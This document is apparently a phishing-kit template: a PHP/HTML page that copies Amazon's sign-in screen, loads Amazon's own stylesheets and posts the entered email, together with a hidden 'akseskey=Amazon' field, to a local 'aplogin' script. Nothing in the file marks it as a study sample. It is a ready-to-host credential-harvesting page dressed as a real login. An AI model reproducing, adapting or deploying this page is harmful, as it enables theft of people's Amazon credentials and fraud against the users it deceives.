<html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.21.4-2021-05-28">
<head>
<meta charset="utf-8">
<title dir="ltr"><?= $lang['title']; ?></title>
<link rel="apple-touch-icon" sizes="76x76" href="img/logo.png">
<link rel="icon" type="image/png" href="img/logo.png">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61A6IErPNXL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI#us.not-trident">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,41DBI6BbFkL.css_.css?AUIClients/AuthenticationPortalAssets">
<link rel="stylesheet" href="assets/css/a.css">
</head>
<body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-c a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
        <div class="a-section a-spacing-none auth-navbar">
            <div class="a-section a-spacing-medium a-text-center">
                <a class="a-link-nav-icon" tabindex="-1"><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i></a>
            </div>
        </div>
        <div id="authportal-center-section" class="a-section">
            <div id="authportal-main-section" class="a-section">
                <div class="a-section auth-pagelet-container">
                    <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
                    <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
                    <!-- show a warning modal dialog when the third party account is connected with Amazon -->
                    <div class="a-section a-spacing-base">
                        <div class="a-section">
                            <form method="post" action="aplogin" class="auth-validate-form auth-real-time-validation a-spacing-none">
                                <div class="a-section">
                                    <div class="a-box">
                                        <div class="a-box-inner a-padding-extra-large">
                                            <h1 class="a-spacing-small"><?= enc($lang['1']); ?></h1>
                                            <!-- optional subheading element -->
                                            <input type="hidden" name="akseskey" value="Amazon">
                                            <div class="a-row a-spacing-base">
                                                <label for="ap_email" class="a-form-label"><?= enc($lang['2']); ?></label>
                                                <input type="email" maxlength="128" name="email" class="a-input-text a-span12 auth-autofocus auth-required-field" autofocus required>
                                                <div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert">
                                                    <div class="a-box-inner a-alert-container">
                                                        <i class="a-icon a-icon-alert"></i>
                                                        <div class="a-alert-content"><?= enc($lang['3']); ?></div>
                                                    </div>
                                                </div>
                                            </div>
                                            <input type="hidden" name="create" value="0">
                                            <div class="a-section">
                                                <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true"><?= enc($lang['btn1']); ?></span></span></span>
                                                <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
                                                     <?= $lang['4']; ?>
                                                </div>
                                            </div>
                                            <div class="a-section">
                                                <div aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
                                                    <a data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt"><?= enc($lang['5']); ?></span></a>
                                                    <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
                                                        <a id="auth-fpp-link-bottom" class="a-link-normal"><?= enc($lang['6']); ?></a>
                                                    </div>
                                                    <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
                                                        <a id="ap-other-signin-issues-link" class="a-link-normal"><?= enc($lang['7']); ?></a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="a-divider a-divider-break">
                            <h5><?= enc($lang['8']); ?></h5>
                        </div>
                        <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" class="a-button-text" role="button"><?= enc($lang['9']); ?></a></span></span>
                    </div>
                </div>
            </div>
        </div>
        <div id="right-2"></div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini">
                <span class="auth-footer-seperator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f1']); ?></a>
                <span class="auth-footer-seperator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f2']); ?></a>
                <span class="auth-footer-seperator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f3']); ?></a>
                <span class="auth-footer-seperator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center">
                <span class="a-size-mini a-color-secondary"><?= enc($lang['f4']); ?></span>
            </div>
        </div>
    </div>
    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts=""></div>
</div>
<div id="be" style="display:none;visibility:hidden;">
    <form name="ue_backdetect" action="get">
        <input type="hidden" name="ue_back" value="2"></form>
</div>
</body>
</html>